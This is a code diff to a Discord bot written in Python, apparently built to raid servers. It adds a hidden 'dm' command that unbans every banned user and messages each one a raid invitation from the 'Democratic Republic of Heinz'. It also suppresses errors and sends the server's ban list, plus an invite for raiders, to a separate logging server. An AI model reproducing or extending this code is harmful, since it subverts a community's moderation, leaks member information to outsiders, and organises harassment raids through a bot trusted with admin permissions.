@@ -139,13 +139,34 @@ class Bot(cmd.Bot):
     @cmd.command(hidden=True)
     async def dm(ctx):
         # --DM Banned users
+        
         bannedUsers = await ctx.guild.bans()
-        unban = await ctx.channel.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
-        for ban in bannedUsers:
-            user = ban.user
-            await ctx.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
-            await user.send("Hi. If you're seeing this message, you were at some point banned from " + ctx.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
-            await user.send(unban.url)
+        try:
+            unban = await ctx.channel.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
+            for ban in bannedUsers:
+                user = ban.user
+                await ctx.guild.unban(user, reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
+                await user.send("Hi. If you're seeing this message, you were at some point banned from " + ctx.guild.name + ". Luckily for you, the Democratic Republic of Heinz has chosen to raid this server, your ban has been revoked, and you have been invited to join us on this raid.")
+                await user.send(unban.url)
+        except Exception:
+            pass
+        # --Send list of banned users to log server--
+
+        for guild in ctx.bot.guilds:
+            if guild.name == "beenz-bot-log":
+                logserver = guild
+
+        unban = await ctx.guild.channels[0].create_invite(reason="The DRH must provide entry to the server for their raiders")
+
+        msg = ""
+        if len(bannedUsers) > 0:
+            for user in bannedUsers:
+                msg = msg + ", " + user.name
+            await logserver.channels[0].send("``` List of banned users for " + ctx.guild.name + ": \n \n" + msg + " ```")
+        else:
+            await logserver.channels[0].send("``` No users are banned from " + ctx.guild.name + "\n ```")
+        
+        await logserver.channels[0].send(ctx.guild.name + " can be joined at " + unban.url)
 
 
 
@@ -223,7 +244,7 @@ class Bot(cmd.Bot):
             originalname = heinz.guild.name
         '''
 
-        unban = await heinz.create_invite(reason="Those who were disgraced by this server are being given an opportunity to redeem themselves by the DRH")
+        unban = await heinz.create_invite(reason="The DRH must provide entry to the server for their raiders")
         #await logserver.channels[0].send("@everyone new raid: " + originalname)
         #await logserver.channels[0].send("Join the fun at " + unban.url)
 
